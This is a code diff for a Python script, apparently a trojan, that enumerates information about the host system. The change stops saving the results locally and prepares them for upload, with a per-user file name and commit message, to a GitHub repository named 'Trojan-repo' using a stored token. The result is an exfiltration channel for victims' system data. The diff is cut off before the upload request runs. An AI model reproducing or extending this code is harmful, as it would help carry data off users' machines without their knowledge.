@@ -7,7 +7,6 @@ import json
 import requests
 import base64
 from dotenv import load_dotenv
-from collections.abc import Mapping
 
 
 class SystemEnumeration:
@@ -39,27 +38,20 @@ system_info = security_tool.gather_info()
 # Print the system information
 print(json.dumps(system_info, indent=4))
 
-# Create a unique output file name using the username and current datetime
+# Create a unique file name for the upload
 username = system_info.get("username", "Unknown")
 current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-output_file = f"system_info_{username}_{current_time}.json"
-
-# Write the system information to the output file
-with open(output_file, "w") as file:
-    file.write(json.dumps(system_info, indent=4))
-
-print(f"System information has been saved to {output_file}.")
+file_path = f"data/system_info_{username}_{current_time}.json"  # Dynamic GitHub file path
+file_content = json.dumps(system_info, indent=4)  # Convert dict to JSON string for GitHub
 
 # GitHub repository details
 repository_owner = "BlertaJashanica"
 repository_name = "Trojan-repo"
-file_path = "data/"+output_file  # Correct file path with filename
-file_content = json.dumps(system_info, indent=4)  # Convert dict to JSON string for GitHub
 
 load_dotenv()  # Load environment variables from .env file
 github_token = os.getenv("GITHUB_TOKEN")
 
-commit_message = 'Updated system info'
+commit_message = f"System info for {username} at {current_time}"
 
 # GitHub API URL
 api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
